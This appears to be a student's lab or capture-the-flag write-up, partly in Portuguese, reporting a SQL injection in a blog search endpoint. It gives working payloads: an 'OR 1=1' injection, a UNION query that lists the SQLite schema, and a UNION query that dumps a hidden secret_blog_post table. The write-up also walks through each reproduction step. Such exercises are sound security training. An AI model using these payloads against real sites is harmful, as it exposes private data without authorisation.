SELECT id, title, content FROM blog_post WHERE title LIKE '' OR 1=1; -- ' OR content LIKE '%' asdasd%'

' UNION SELECT name, name, sql  FROM sqlite_master; -- 

primeiro tentei só com 1 name mas percebi que ambas a tabelas tinham de ter o mesmo numero de colunas por isso meti name name name, mas assim não saberia o nomo das colunas do secret_blog_post, e vi que substituindo o terceiro name por sql conseguia saber o nome das colunas.

secret_blog_post
CREATE TABLE secret_blog_post ( id INTEGER NOT NULL, title TEXT, content TEXT, PRIMARY KEY (id), UNIQUE (title) )

' UNION SELECT id, title, content FROM secret_blog_post; -- 


# ist193587

## Vulnerabilty

Endpoint is vulnerable to SQL injection

## Where

Situated in the blog posts search

## Impact

Allows the user to see secret posts.

## Steps to Reproduce

1. First i discovered with this payload in the blog search `'a'` some variables that the blog_posts has and how the code is.
2. With this in mind i looked into a sqlite_master and try to do a simple payload `' UNION SELECT name FROM sqlite_master; -- ` and saw the error saying that there is a difference in columns, with this in mind i made this change `' UNION SELECT name, name, sql  FROM sqlite_master; -- ` and i was able to see the hidden articles columns and find out the columns for secret_blog_post.  
3. With the columns of the secret_blog_post i did this payload `' UNION SELECT id, title, content FROM secret_blog_post; -- ` and we can see the content of the secret_blog_post